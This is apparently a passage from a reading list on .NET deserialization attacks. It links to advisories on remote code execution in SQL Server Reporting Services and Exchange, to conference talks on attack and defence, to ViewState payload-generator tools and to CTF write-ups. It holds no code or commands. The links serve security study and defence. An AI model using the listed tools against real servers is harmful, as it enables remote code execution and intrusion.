- https://www.nccgroup.trust/uk/our-research/technical-advisory-code-execution-by-viewing-resource-files-in-net-reflector/
- https://www.mdsec.co.uk/2020/02/cve-2020-0618-rce-in-sql-server-reporting-services-ssrs/
- https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys

### Talks:
- https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf
- https://speakerdeck.com/pwntester/attacking-net-serialization
- https://speakerdeck.com/pwntester/dot-net-serialization-detecting-and-defending-vulnerable-endpoints
- https://gosecure.github.io/presentations/2018-03-18-confoo_mtl/Security_boot_camp_for_.NET_developers_Confoo_v2.pdf
- https://illuminopi.com/assets/files/BSidesIowa_RCEvil.net_20190420.pdf
- https://nullcon.net/website/archives/pdf/goa-2018/rohit-slides.pdf

### Tools:
- https://github.com/pwntester/ViewStatePayloadGenerator
- https://github.com/0xACB/viewgen
- https://github.com/Illuminopi/RCEvil.NET

### CTF write-ups:
- https://cyku.tw/ctf-hitcon-2018-why-so-serials/
- https://xz.aliyun.com/t/3019
